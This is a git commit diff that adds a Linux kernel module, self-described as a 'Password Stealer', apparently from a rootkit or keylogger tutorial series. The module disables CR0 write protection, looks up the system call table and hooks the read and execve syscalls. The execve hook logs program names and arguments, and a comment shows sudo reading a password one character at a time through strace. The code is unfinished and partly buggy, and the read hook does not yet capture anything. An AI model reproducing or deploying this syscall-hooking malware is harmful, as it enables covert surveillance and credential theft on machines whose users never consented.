0550c26978fcde38337803f14c4a9207861dd28d
SourceCodeDeleted <sourcecodedeleted@ukr.net>
2020-03-26 13:00:18 +0200

    added module 11 execve

---
+++ module11_Hooking_SyscallRead_Keylogger/main.c
@@ -0,0 +1,340 @@
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/syscalls.h>
+#include <linux/kallsyms.h>
+#include <linux/slab.h>
+#include <linux/kern_levels.h>
+#include <linux/gfp.h>
+#include <asm/unistd.h>
+#include <asm/paravirt.h>
+
+
+#include <linux/binfmts.h>
+#include <linux/uaccess.h>
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("SourceCodeDeleted");
+MODULE_DESCRIPTION("Simple Hooking Password Stealer Syscall");
+MODULE_VERSION("1.0");
+
+
+unsigned long **SYS_CALL_TABLE;
+
+
+void EnablePageWriting(void){
+	write_cr0(read_cr0() & (~0x10000));
+
+} 
+void DisablePageWriting(void){
+	write_cr0(read_cr0() | 0x10000);
+
+} 
+
+// EXECVE STRACE
+
+/*
+# sudo  strace -u myusername  sudo -k pwd
+execve("/bin/ls", ["ls", "-l"], 0x7ffc804d9e98 ) = 0
+execve("/usr/bin/sudo", ["sudo", "-k", "pwd"], 0x7ffdff5fec50  24 vars ) = 0
+access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
+
+...
+...
+...
+write(4, "[sudo] password for myusername: ", 27[sudo] password for myusername: ) = 27
+write(4, "*", 1*)                        = 1
+read(4, "s", 1)                         = 1
+write(4, "*", 1*)                        = 1
+read(4, "d", 1)                         = 1
+write(4, "*", 1*)                        = 1
+read(4, "d", 1)                         = 1
+write(4, "*", 1*)                        = 1
+read(4, "a", 1)                         = 1
+write(4, "*", 1*)                        = 1
+read(4, "s", 1)                         = 1
+write(4, "*", 1*)                        = 1
+read(4, "d", 1)                         = 1
+write(4, "*", 1*)                        = 1
+read(4, "\n", 1)                        = 1
+write(4, "\10 \10", )                  = 3
+write(4, "\10 \10", )                  = 3
+write(4, "\10 \10", )                  = 3
+write(4, "\10 \10", )                  = 3
+write(4, "\10 \10", )                  = 3
+write(4, "\10 \10", )                  = 3
+write(4, "\10 \10", )                  = 3
+write(4, "\10 \10", )                  = 3
+alarm(0)                                = 0
+write(4, "\n", 1
+)                       = 1
+...
+...
+...
+openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 4
+
+
+*/
+/*
+
+Table 1. The User Space Memory Access API
+Function	Description
+access_ok	Checks the validity of the user space memory pointer
+get_user	Gets a simple variable from user space
+put_user	Puts a simple variable to user space
+clear_user	Clears, or zeros, a block in user space
+copy_to_user	Copies a block of data from the kernel to user space
+copy_from_user	Copies a block of data from user space to the kernel
+strnlen_user	Gets the size of a string buffer in user space
+strncpy_from_user	Copies a string from user space into the kernel
+
+
+
+
+
+
+*/
+
+
+
+struct user_arg_ptr {
+#ifdef CONFIG_COMPAT
+	bool is_compat;
+#endif
+	union {
+		const char __user *const __user *native;
+#ifdef CONFIG_COMPAT
+		const compat_uptr_t __user *compat;
+#endif
+	} ptr;
+};
+
+
+
+
+
+static const char __user *get_user_arg_ptr(struct user_arg_ptr argv, int nr)
+{
+	const char __user *native;
+
+	if (get_user(native, argv.ptr.native + nr))
+		return ERR_PTR(-EFAULT);
+
+	return native;
+}
+
+
+
+static int count(struct user_arg_ptr argv, int max)
+{
+	int i = 0;
+
+	if (argv.ptr.native != NULL) {
+		for (;;) {
+			const char __user *p = get_user_arg_ptr(argv, i);
+
+			if (!p)
+				break;
+
+			if (IS_ERR(p))
+				return -EFAULT;
+
+			if (i >= max)
+				return -E2BIG;
+			++i;
+
+			if (fatal_signal_pending(current))
+				return -ERESTARTNOHAND;
+			cond_resched();
+		}
+	}
+	return i;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+char char_buffer[255] = {0};
+// Note: Do not name variables similar, especially globals.
+// The argc <-> argz <-> argv differ only in one char.
+// and 2d array to hold arguments strings
+char argz[255][255] = {0};
+// the count of arguments
+size_t argc = 0;
+
+
+char CharBuffer [255] = {'\0'};
+char Argz       [255] = {'\0'};;
+
+
+
+
+/* from: /usr/src/linux-headers-$(uname -r)/include/linux/syscalls.h */
+asmlinkage int (*origional_execve)(const char *filename, char *const argv[], char *const envp[]);
+asmlinkage int HookExecve(const char *filename, char *const argv[], char *const envp[]) {
+
+ 	   unsigned int len     = sizeof(CharBuffer) / sizeof(CharBuffer[0]);
+       unsigned int Argzlen = sizeof(Argz)       / sizeof(Argz[0]);
+
+        copy_from_user(&CharBuffer , filename , strnlen_user(filename , sizeof(CharBuffer) - 1  ) );
+        printk( KERN_INFO "Executable Name %s  \n", CharBuffer );
+     
+             char foo = "zzz";
+            //get_user(foo , *&argv+1);
+            int Length  = strnlen_user(*argv , 3);
+            printk (KERN_INFO "Access OK ! %d", Length);
+            // copy_from_user(&CharBuffer , argv , 8   );
+            
+			strncpy_from_user(Argz, *argv , 4);
+
+            //str = get_user_arg_ptr(argv, i);
+            //len = strnlen_user(str, MAX_ARG_STRLEN);
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        // if( access_ok(VERIFY_READ ,argv, strnlen_user(&argv , 12) ) == true ){
+
+        //   printk (KERN_INFO "Access OK ! ");
+        // }
+
+        //int Length  = strnlen_user(argv[1] , MAX_ARG_STRLEN);
+
+        //strncpy_from_user(Argz, argv[0]);
+    
+
+        //str = get_user_arg_ptr(argv, argc);
+        //int Length  = strnlen_user(argv[0] , 3);
+
+        //copy_from_user(argz[0], argv[0], strnlen_user(argv[0] , MAX_ARG_STRLEN ));
+
+	
+	// size_t i = 0;
+    // for (i = 0; argv[i] != 0; ++i) {
+
+    //      // note: argz has type `char (*)[255][255]`
+    //      // so: sizeof(argz) = 255 * 255 * sizeof(char)
+    //      // *argz has type `char (*)[255]`
+    //      // so: sizeof(*argz) = 255 * 255 * sizeof(char)
+    //      // so: sizeof(argz)/sizeof(*argz) = 255
+    //      // This would NOT work if `argz` would be a `char**`...
+    //      // if (i > sizeof(argz)/sizeof(*argz)) {
+    //      // but there is ARRAY_SIZE macro that does the same
+
+    //  //// Removed
+    //  //     if (i > ARRAY_SIZE(argz)) {
+    //  //          // TODO: not enough indexes
+    //  //          return (*origional_execve)(filename, argv, envp);
+    //  //     }
+
+    //      // sizeof(argz[i]) = sizeof(char(*)[255]) = 
+    //      //                 = 255 * sizeof(char) = 255
+    //      //
+
+    //  //// Section Removed
+    //  //     if (strnlen_user(argv[i], (MAX_ARG_STRLEN - 1)  ) + 1 > sizeof(argz[i]) ) {
+    //  //          // TODO: no memory to copy
+    //  //          return (*origional_execve)(filename, argv, envp);
+    //  //     }
+    //      copy_from_user(argz[i], argv[i], strnlen_user(argv[i] , (MAX_ARG_STRLEN - 1) ) + 1);
+    // }
+    // argc = i;
+
+    // printk( KERN_INFO "Executable Name %s \n", char_buffer);
+//     for (size_t i = 0; i < argc; ++i) {
+//         printk( KERN_INFO "arg[i] = %s\n", argz[i]);            
+//     }
+
+
+
+
+
+
+  return (*origional_execve)(filename, argv, envp);
+}
+
+
+
+
+
+asmlinkage int (*original_read)(unsigned int, void __user*, size_t);
+asmlinkage int  HookRead(unsigned int fd, void __user* buf, size_t count) {
+	//printk(KERN_INFO "READ HOOKED HERE! -- This is our function!");
+
+	return (*original_read)(fd, buf, count);
+}
+
+
+
+
+
+
+static int __init SetHooks(void) {
+	// Gets Syscall Table **
+ 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 
+
+	printk(KERN_INFO "Hooks Will Be Set.\n");
+	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);
+
+
+	EnablePageWriting();
+
+    // Replaces Pointer Of Syscall_read on our syscall.
+	
+
+
+	// KEEP THIS ORDER!!! 
+	// CRASH WILL HAPPEN
+	original_read = (void*)SYS_CALL_TABLE[__NR_read];
+	SYS_CALL_TABLE[__NR_read] = (unsigned long*)HookRead;
+
+	origional_execve = (void*)SYS_CALL_TABLE[__NR_execve];
+	SYS_CALL_TABLE[__NR_execve] = (unsigned long*)HookExecve;
+	
+	DisablePageWriting();
+
+	return 0;
+}
+
+
+
+
+
+
+
+static void __exit HookCleanup(void) {
+
+	// Clean up our Hooks
+	EnablePageWriting();
+	SYS_CALL_TABLE[__NR_read]   = (unsigned long*)original_read;
+	SYS_CALL_TABLE[__NR_execve] = (unsigned long*)origional_execve;
+	DisablePageWriting();
+
+	printk(KERN_INFO "HooksCleaned Up!");
+}
+
+module_init(SetHooks);
+module_exit(HookCleanup);
